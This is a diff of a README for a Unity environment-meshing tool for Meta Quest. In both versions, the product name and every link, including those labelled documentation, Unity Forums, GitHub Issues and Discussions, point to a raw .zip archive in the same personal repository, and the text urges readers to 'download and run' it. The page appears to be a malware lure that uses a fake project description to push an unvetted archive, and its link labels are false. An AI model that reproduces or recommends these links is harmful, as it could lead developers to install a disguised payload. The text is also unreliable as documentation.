@@ -1,14 +1,14 @@
-# 🌟 https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip - Effortless Environment Mesh Generation for Unity
+# 🌟 https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip - Effortless Environment Mesh Generation for Unity
 
-[![Download https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip](https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip)](https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip)
+[![Download https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip](https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip)](https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip)
 
 ## 📦 Overview
 
-https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip is a tool designed for Unity developers. It allows real-time mesh generation, navigation mesh creation, and collision detection. This is achieved using the Meta Quest Depth API. With https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip, you can elevate your Unity projects by integrating advanced environment capabilities without needing deep programming skills.
+https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip is a tool designed for Unity developers. It allows real-time mesh generation, navigation mesh creation, and collision detection. This is achieved using the Meta Quest Depth API. With https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip, you can elevate your Unity projects by integrating advanced environment capabilities without needing deep programming skills.
 
 ## 🚀 Getting Started
 
-To get started with https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip, simply follow these steps:
+To get started with https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip, simply follow these steps:
 
 1. **Ensure You Have Unity Installed**: Download Unity Hub from the official Unity website and install the Unity Editor. Version 2020.3 or later is recommended.
 
@@ -16,9 +16,9 @@ To get started with https://raw.githubusercontent.com/bertrandpointofsale437/UXR
 
 ## 📥 Download & Install
 
-To download https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip, visit the Releases page using the link below:
+To download https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip, visit the Releases page using the link below:
 
-[Visit the Releases Page to Download https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip](https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip)
+[Visit the Releases Page to Download https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip](https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip)
 
 Once on the Releases page, locate the latest version. Click on the `.unitypackage` file to download it to your computer.
 
@@ -62,20 +62,20 @@ After importing the package, you will need to set it up. Here’s how to get you
 
 ## 📃 Additional Resources
 
-- **Documentation**: Visit the [official documentation](https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip) for detailed guides and best practices.
-- **Community Forum**: Join our discussions at [Unity Forums](https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip) to share experiences and ask questions.
-- **GitHub Issues**: If you encounter bugs, report them directly on our [GitHub Issues page](https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip).
+- **Documentation**: Visit the [official documentation](https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip) for detailed guides and best practices.
+- **Community Forum**: Join our discussions at [Unity Forums](https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip) to share experiences and ask questions.
+- **GitHub Issues**: If you encounter bugs, report them directly on our [GitHub Issues page](https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip).
 
 ## ✨ Contributing
 
-We welcome contributions! If you’d like to add to https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip, please fork the repo and create a pull request. Make sure to include a description of your changes.
+We welcome contributions! If you’d like to add to https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip, please fork the repo and create a pull request. Make sure to include a description of your changes.
 
 ## 📖 License
 
-https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip is licensed under the MIT License. You are free to use, modify, and distribute the software as you see fit, within the terms of the license.
+https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip is licensed under the MIT License. You are free to use, modify, and distribute the software as you see fit, within the terms of the license.
 
 ## 🆘 Need Help?
 
-For further assistance, feel free to reach out on our [GitHub Discussions page](https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip).
+For further assistance, feel free to reach out on our [GitHub Discussions page](https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip).
 
-By following these steps and guidelines, you will be able to download and run https://raw.githubusercontent.com/bertrandpointofsale437/UXR.QuestMeshing/master/UXR.QuestMeshing/ProjectSettings/Packages/UXR.QuestMeshing-1.4.zip successfully. Enjoy creating immersive environments in Unity!
+By following these steps and guidelines, you will be able to download and run https://github.com/bertrandpointofsale437/UXR.QuestMeshing/raw/refs/heads/master/Documentation/DocSource/Quest-UX-Meshing-1.3-alpha.4.zip successfully. Enjoy creating immersive environments in Unity!
